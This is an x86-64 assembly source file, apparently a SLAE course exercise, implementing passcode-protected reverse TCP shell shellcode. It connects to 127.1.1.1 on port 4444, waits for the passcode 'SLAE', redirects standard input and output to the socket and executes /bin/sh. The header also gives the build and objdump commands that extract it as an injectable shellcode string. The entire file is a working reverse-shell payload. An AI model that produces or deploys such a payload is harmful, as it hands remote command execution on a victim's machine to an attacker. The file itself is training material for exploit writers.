; Filename:      reverse_tcp_shell_passcode.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  26.01.2019
; Note:          x64
; Assembler:     nasm -f elf64 reverse_tcp_shell_passcode.nasm -o reverse_tcp_shell_passcode.o
; Linker:        ld -m elf_x86_64 reverse_tcp_shell_passcode.o -o reverse_tcp_shell_passcode
; Assembly dump: objdump -d ./reverse_tcp_shell_passcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

_start:

  ; Create a UNIX socket (sys_socket)
  ; int socket(int domain, int type, int protocol);
  ; sock = socket(AF_INET, SOCK_STREAM, 0)
  xor rax, rax                     ; Clear rax register
  mov rdi, rax                     ; Clear rdi register
  mov rsi, rax                     ; Clear rsi register
  mov rdx, rax                     ; Clear rdx register
  mov al, 41                       ; sys_socket
  mov dil, 2                       ; AF_INET = 2
  mov sil, 1                       ; SOCK_STREAM = 1
  syscall

  mov rdi, rax                     ; Copy socket descriptor to rdi
  mov r15, rdi                     ; Second copy for after passcode check

  ; Connect to remote host (sys_connect)
  ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  xor rax, rax                     ; Clear rax register
  push rax                         ; Push to stack 0x0000000000000000 (bzero)
  mov dword [rsp-4], 0x0101017f    ; 127.1.1.1 (inet_addr)
  mov word [rsp-6], 0x5c11         ;  0x115c = 4444 (PORT)
  mov word [rsp-8], ax             ; 0x0000 nullbyte trick
  add byte [rsp-8], 0x2            ; 0x0002 (AF_INET)
  sub rsp, 8                       ; Change stack pointer here ^

  xor rax, rax                     ; Clear rax register
  mov rdx, rax                     ; Clear rdx register
  mov rsi, rsp                     ; sockaddr *addr
  mov al, 42                       ; sys_connect
  mov dl, 16                       ; addrlen
  syscall

  ; Read input fron socket FD (sys_read)
  ; sys_read ssize_t read(int fd, void *buf, size_t count);
  enter_code:
    xor rax, rax                   ; sys_read
    mov rdx, rax                   ; Clear rdx register
    lea rsi, [rsp]                 ; *buf, load current stack pointer address
    mov rdi, r15                   ; fd, client socket file descriptor
    mov dl, 0x4                    ; size_t, set input size to 4 bytes passcode
    syscall

    mov eax, 0x45414C53            ; "SLAE" = 534C4145 in reverse order
    lea rdi, [rsp]                 ; Load address of input string
    scasd                          ; Compare string
    jnz enter_code                 ; Repeat if passcode is wrong

  mov rdi, r15                     ; Restore client socket descriptor

  ; Duplicate file descriptor to client socket (sys_dup2)
  ; int dup2(int oldfd, int newfd);
  xor rsi, rsi                     ; Clear rsi register
  mov sil, 2                       ; oldfd = stderr (2)

  duplicate:
    push 33                          ; Push syscall sys_dup2
    pop rax                          ; sys_dup2
    syscall

    dec rsi                          ; stdout (1) and  stdin (0)
    jns duplicate                    ; Jump if not sign (SF=0)

  ; Execute /bin/sh shell (sys_execve)
  ; int execve(const char *filename, char *const argv[], char *const envp[]);
  xor rax, rax                     ; Clear rsi register
  push rax                         ; First NULL push
  mov rbx, 0x68732f2f6e69622f      ; Set rbx to /bin//sh in reverse
  push rbx                         ; Push rbx
  mov rdi, rsp                     ; Store /bin//sh address in rdi (*filename)
  push rax                         ; Second NULL push
  mov rdx, rsp                     ; Set rdx (envp[] = NULL)
  push rdi                         ; Push address of /bin//sh
  mov rsi, rsp                     ; Set rsi (argv[])
  add rax, 59                      ; sys_execve
  syscall
